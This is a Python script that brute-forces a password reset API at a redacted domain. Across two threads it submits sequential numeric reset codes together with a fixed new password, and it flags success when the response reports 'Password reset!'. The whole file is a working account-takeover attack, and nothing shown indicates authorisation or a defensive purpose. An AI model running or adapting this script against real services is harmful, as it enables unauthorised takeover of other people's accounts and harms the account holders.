import requests
import threading

url = "https://XXX.COM/api/password/reset"
headers = {
    "Host": "api.xxx.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-GB,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/json",
    "Origin": "https://www.xxx.com",
    "Dnt": "1",
    "Sec-Gpc": "1",
    "Referer": "https://www.xxx.com/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "Te": "trailers",
    "Connection": "close",
}

# Data template
data_template = {
    "code": "",
    "password": "gDcE}!Mef;k8QFS",
    "password_confirmation": "gDcE}!Mef;k8QFS",
}

# Range of codes to test
code_range = range(11435104, 11435709)  # Adjusted for testing

# Number of threads to use
num_threads = 2

# Calculate the step for each thread
step = len(code_range) // num_threads

def send_request(thread_code_range):
    for code in thread_code_range:
        data_template["code"] = str(code)
        response = requests.post(url, headers=headers, json=data_template)
        
        print(f"Request for code {code}:")
        print(f"Response Status Code: {response.status_code}")
        print(response.text)
        
        if response.status_code == 200 and "Password reset!" in response.text:
            print("Successful request.")

# Multithreading approach with ranges
threads = []

for i in range(num_threads):
    start_index = i * step
    end_index = (i + 1) * step if i < num_threads - 1 else len(code_range)
    thread_code_range = code_range[start_index:end_index]
    
    thread = threading.Thread(target=send_request, args=(thread_code_range,))
    threads.append(thread)
    thread.start()

# Wait for all threads to finish
for thread in threads:
    thread.join()

print("All threads have finished.")
